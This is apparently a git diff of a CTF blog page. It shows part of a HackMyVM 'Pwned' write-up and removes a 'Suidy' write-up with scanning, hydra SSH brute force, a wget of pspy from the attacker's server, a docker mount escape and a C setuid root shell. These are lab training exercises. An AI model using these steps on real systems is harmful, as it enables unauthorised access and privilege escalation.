..</span><br><span class="line">-rw-r--r-- 1 ariana ariana  142 Jul 10  2020 ariana-personal.diary</span><br><span class="line">-rw------- 1 ariana ariana    4 Jul 10  2020 .bash_history</span><br><span class="line">-rw-r--r-- 1 ariana ariana  220 Jul  4  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ariana ariana 3526 Jul  4  2020 .bashrc</span><br><span class="line">drwxr-xr-x 3 ariana ariana 4096 Jul  6  2020 .local</span><br><span class="line">-rw-r--r-- 1 ariana ariana  807 Jul  4  2020 .profile</span><br><span class="line">drwx------ 2 ariana ariana 4096 Jul  9  2020 .ssh</span><br><span class="line">-rw-r--r-- 1 ariana ariana  143 Jul 10  2020 user1.txt</span><br><span class="line">ariana@pwned:~$ cat user1.txt</span><br><span class="line">congratulations you Pwned ariana</span><br><span class="line"></span><br><span class="line">Here is your user flag ↓↓↓↓↓↓↓</span><br><span class="line"></span><br><span class="line">fb8d98be1265dd88bac522e1b2182140</span><br><span class="line"></span><br><span class="line">Try harder.need become root</span><br><span class="line"></span><br><span class="line">ariana@pwned:~$ cat ariana-personal.diary</span><br><span class="line">Its Ariana personal Diary :::</span><br><span class="line"></span><br><span class="line">Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> -l</span></span><br><span class="line">Matching Defaults entries for ariana on pwned:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User ariana may run the following commands on pwned:</span><br><span class="line">    (selena) NOPASSWD: /home/messenger.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /home/messenger.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">msg 2&gt; /dev/null</span></span><br><span class="line"></span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"> <span class="built_in">sudo</span> -u selena /home/messenger.sh</span></span><br><span class="line">&#x27;alacritty&#x27;: unknown terminal type.</span><br><span class="line">Welcome to linux.messenger</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ariana:</span><br><span class="line">selena:</span><br><span class="line">ftpuser:</span><br><span class="line"></span><br><span class="line">Enter username to send message : selena</span><br><span class="line"></span><br><span class="line">Enter message for selena :/bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)</span><br><span class="line"></span><br><span class="line">python3 -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span><br><span class="line">selena@pwned:/home/ariana$</span><br><span class="line"></span><br><span class="line">selena@pwned:~$ cat user2.txt selena-personal.diary</span><br><span class="line">711fdfc6caad532815a440f7f295c176</span><br><span class="line"></span><br><span class="line">You are near to me. you found selena too.</span><br><span class="line"></span><br><span class="line">Try harder to catch me</span><br><span class="line">Its Selena personal Diary :::</span><br><span class="line"></span><br><span class="line">Today Ariana fight with me for Ajay. so i left her ssh key on FTP. now she resposible for the leak.</span><br><span class="line"></span><br><span class="line">selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -la</span></span><br><span class="line">total 28</span><br><span class="line">drwx------  3 root root 4096 Jul 10  2020 .</span><br><span class="line">drwxr-xr-x 18 root root 4096 Jul  6  2020 ..</span><br><span class="line">-rw-------  1 root root  292 Jul 10  2020 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  601 Jul  6  2020 .bashrc</span><br><span class="line">drwxr-xr-x  3 root root 4096 Jul  4  2020 .local</span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">-rw-r--r--  1 root root  429 Jul 10  2020 root.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> root.txt</span></span><br><span class="line">4d4098d64e163d2726959455d046fd7c</span><br><span class="line"></span><br><span class="line">You found me. i dont&#x27;t expect this （◎ . ◎）</span><br><span class="line"></span><br><span class="line">I am Ajay (Annlynn) i hacked your server left and this for you.</span><br><span class="line"></span><br><span class="line">I trapped Ariana and Selena to takeover your server :)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You Pwned the Pwned congratulations :)</span><br><span class="line"></span><br><span class="line">share the screen shot or flags to given contact details for confirmation</span><br><span class="line"></span><br><span class="line">Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g</span><br><span class="line"></span><br><span class="line">Instgarm   ajs_walker</span><br><span class="line"></span><br><span class="line">Twitter    Ajs_walker</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackMyVM/HackMyVM-Suidy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackMyVM/HackMyVM-Suidy/" class="post-title-link" itemprop="url">HackMyVM - Suidy</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2025-08-22 18:03:40" itemprop="dateCreated datePublished" datetime="2025-08-22T18:03:40+08:00">2025-08-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>849</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>3 mins.</span>
-    </span>
-</div>
-
-            <div class="post-description">Hidden directory discovery, SSH brute-force, and custom SUID binary exploitation.</div>
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="suidy">suidy</h1>
-<p>scan</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ rustscan -a  192.168.0.109 -- -A -sV</span><br><span class="line">PORT   STATE SERVICE REASON  VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">53/tcp open  domain  syn-ack (generic dns response: SERVFAIL)</span><br><span class="line">80/tcp open  http    syn-ack nginx 1.14.2</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br></pre></td></tr></table></figure>
-<p>web</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ gobuster dir -u http://192.168.0.109/ -w ~/wordlists/dir.txt</span><br><span class="line">/index.html           (Status: 200) [Size: 22]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 362]</span><br></pre></td></tr></table></figure>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://192.168.0.109/robots.txt</span><br><span class="line"></span><br><span class="line">/hi</span><br><span class="line">/....\..\.-\--.\.-\..\-.</span><br><span class="line">/shehatesme</span><br><span class="line"></span><br><span class="line">.... .. .- --. .- .. -.</span><br><span class="line">from morse code</span><br><span class="line">HIAGAIN</span><br><span class="line">hiagain</span><br><span class="line"></span><br><span class="line">http://192.168.0.109/shehatesme/</span><br><span class="line"></span><br><span class="line">She hates me because I FOUND THE REAL SECRET!</span><br><span class="line">I put in this directory a lot of .txt files.</span><br><span class="line">ONE of .txt files contains credentials like &quot;theuser/thepass&quot; to access to her system!</span><br><span class="line">All that you need is an small dict from Seclist!</span><br><span class="line"></span><br><span class="line">❯ gobuster dir -u http://192.168.0.109/shehatesme/ -w ~/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt</span><br><span class="line">/full.txt</span><br><span class="line">/about.txt</span><br><span class="line">/search.txt</span><br><span class="line">/privacy.txt</span><br><span class="line">/blog.txt</span><br><span class="line">/new.txt</span><br><span class="line">/page.txt</span><br><span class="line">/forums.txt</span><br><span class="line">/jobs.txt</span><br><span class="line">/other.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/admin.txt</span><br><span class="line">/faqs.txt</span><br><span class="line">/2001.txt</span><br><span class="line">/link.txt</span><br><span class="line">/space.txt</span><br><span class="line">/network.txt</span><br><span class="line">/google.txt</span><br><span class="line">/folder.txt</span><br><span class="line">/java.txt</span><br><span class="line">/issues.txt</span><br><span class="line">/guide.txt</span><br><span class="line">/es.txt</span><br><span class="line">/art.txt</span><br><span class="line">/smilies.txt</span><br><span class="line">/airport.txt</span><br><span class="line">/secret.txt</span><br><span class="line">/procps.txt</span><br><span class="line">/pynfo.txt</span><br><span class="line">/lh2.txt</span><br><span class="line">/muze.txt</span><br><span class="line">/alba.txt</span><br><span class="line">/cymru.txt</span><br><span class="line">/wha.txt</span><br></pre></td></tr></table></figure>
-<p>request and get file</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> sys.stdin:</span><br><span class="line">        j=j.strip()</span><br><span class="line">        response=requests.get(<span class="string">f&quot;http://192.168.0.109/shehatesme<span class="subst">&#123;j&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># print(f&quot;http://192.168.0.109/shehatesme&#123;j&#125;&quot;)</span></span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
-<p>bruteforce</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">❯ cat tmp | python tmp.py | sort | uniq -c</span><br><span class="line">     34</span><br><span class="line">      1 hidden1/passZZ!</span><br><span class="line">     25 jaime11/JKiufg6</span><br><span class="line">      1 jhfbvgt/iugbnvh</span><br><span class="line">      1 john765/FDrhguy</span><br><span class="line">      1 maria11/jhfgyRf</span><br><span class="line">      1 mmnnbbv/iughtyr</span><br><span class="line">      1 nhvjguy/kjhgyut</span><br><span class="line">      1 smileys/98GHbjh</span><br><span class="line">      1 theuser/thepass</span><br><span class="line">      1 yuijhse/hjupnkk</span><br><span class="line"></span><br><span class="line">❯ hydra -L ./tmp -P ./tmp2 ssh://192.168.0.109</span><br><span class="line">[22][ssh] host: 192.168.0.109   login: theuser   password: thepass</span><br><span class="line"></span><br><span class="line">hidden1:passZZ!</span><br><span class="line">jaime11:JKiufg6</span><br><span class="line">jhfbvgt:iugbnvh</span><br><span class="line">john765:FDrhguy</span><br><span class="line">maria11:jhfgyRf</span><br><span class="line">mmnnbbv:iughtyr</span><br><span class="line">nhvjguy:kjhgyut</span><br><span class="line">smileys:98GHbjh</span><br><span class="line">theuser:thepass</span><br><span class="line">yuijhse:hjupnkk</span><br><span class="line"></span><br><span class="line">❯ hydra -C ./tmp  ssh://192.168.0.109</span><br><span class="line">[22][ssh] host: 192.168.0.109   login: theuser   password: thepass</span><br></pre></td></tr></table></figure>
-<p>ssh</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">theuser/thepass</span><br><span class="line">❯ ssh theuser@192.168.0.109</span><br><span class="line">theuser@suidy:~$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 3 theuser theuser 4096 sep 27  2020 .</span><br><span class="line">drwxr-xr-x 4 root    root    4096 sep 26  2020 ..</span><br><span class="line">-rw------- 1 theuser theuser   29 sep 27  2020 .bash_history</span><br><span class="line">-rw-r--r-- 1 theuser theuser  220 sep 26  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 theuser theuser 3526 sep 26  2020 .bashrc</span><br><span class="line">drwxr-xr-x 3 theuser theuser 4096 sep 26  2020 .local</span><br><span class="line">-rw-r--r-- 1 theuser theuser  807 sep 26  2020 .profile</span><br><span class="line">-rw-r--r-- 1 theuser theuser   11 sep 26  2020 user.txt</span><br><span class="line">-rw------- 1 theuser theuser   51 sep 26  2020 .Xauthority</span><br><span class="line">theuser@suidy:~$ cat user.txt</span><br><span class="line">HMV2353IVI</span><br><span class="line"></span><br><span class="line">theuser@suidy:~$ find / -perm -u=s -type f 2&gt;/dev/null | xargs ls -la</span><br><span class="line">-rwsrwsr-x 1 root theuser     16704 sep 26  2020 /home/suidy/suidyyyyy</span><br><span class="line">-rwsr-xr-x 1 root root        54096 jul 27  2018 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root        44528 jul 27  2018 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root        84016 jul 27  2018 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root        51280 ene 10  2019 /usr/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root        44440 jul 27  2018 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root        63736 jul 27  2018 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root        63568 ene 10  2019 /usr/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root        34888 ene 10  2019 /usr/bin/umount</span><br><span class="line">-rwsr-xr-- 1 root messagebus  51184 jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root        10232 mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root       436552 ene 31  2020 /usr/lib/openssh/ssh-keysign</span><br><span class="line"></span><br><span class="line">theuser@suidy:/home/suidy$ ./suidyyyyy</span><br><span class="line">suidy@suidy:/home/suidy$ id</span><br><span class="line">uid=1001(suidy) gid=1000(theuser) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span><br><span class="line">suidy@suidy:/home/suidy$ cat note.txt</span><br><span class="line">I love SUID files!</span><br><span class="line">The best file is suidyyyyy because users can use it to feel as I feel.</span><br><span class="line">root know it and run an script to be sure that my file has SUID.</span><br><span class="line">If you are &quot;theuser&quot; I hate you!</span><br><span class="line"></span><br><span class="line">-suidy</span><br></pre></td></tr></table></figure>
-<p>upload</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❯ python -m http.server</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">suidy@suidy:/home/suidy$ wget http://192.168.0.105:8000/pspy64</span><br><span class="line"></span><br><span class="line">2025/08/08 14:49:41 CMD: UID=0     PID=1      | /sbin/init</span><br><span class="line">2025/08/08 14:50:01 CMD: UID=0     PID=1446   | /usr/sbin/CRON -f</span><br><span class="line">2025/08/08 14:50:01 CMD: UID=0     PID=1447   | /usr/sbin/CRON -f</span><br><span class="line">2025/08/08 14:50:01 CMD: UID=0     PID=1448   | /bin/sh -c sh /root/timer.sh</span><br><span class="line">2025/08/08 14:50:01 CMD: UID=0     PID=1449   | sh /root/timer.sh</span><br></pre></td></tr></table></figure>
-<p>upload and gcc and replace suidyyyyy</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">theuser@suidy:~$ gcc rootshell.c -o suidyyyyy</span><br><span class="line">theuser@suidy:~$ cp suidyyyyy /home/suidy/suidyyyyy</span><br><span class="line"></span><br><span class="line">theuser@suidy:/home/suidy$ ./suidyyyyy</span><br><span class="line">root@suidy:/home/suidy# id</span><br><span class="line"></span><br><span class="line">root@suidy:/root# cat root.txt</span><br><span class="line">HMV0000EVE</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1542,6 +1509,9 @@ target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm
 </div>
 
 <script src="/js/hud.js" defer></script>
+<script src="/vendor/pixi-8.22.0.min.js" defer></script>
+<script src="/js/mesh-pixi.js" defer></script>
+<script src="/js/effect-experiment.js" defer></script>
 
 <!-- hexo injector body_end start --><script id="page-assets-config" type="application/x-page-assets+json">{"fancybox":{"js":{"url":"https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.umd.js","integrity":"sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I="},"css":{"url":"https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.14/dist/fancybox/fancybox.css","integrity":"sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4="}},"wavedrom":{"js":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.6.2/wavedrom.min.js","integrity":"sha256-3hPWxTqi1K1sjmlESiOTH6lfGwYmz8/SFqoAcPxrjwg="},"skin":{"url":"https://cdn.jsdelivr.net/npm/wavedrom@3.6.2/skins/default.js","integrity":"sha256-bUKjUpel+qLgflZd3EfdbhIorwRYgSkaZKM2s/Bi0VI="}}}</script><script src="&#x2F;js&#x2F;page-assets.js" defer></script><!-- hexo injector body_end end --></body>
 </html>
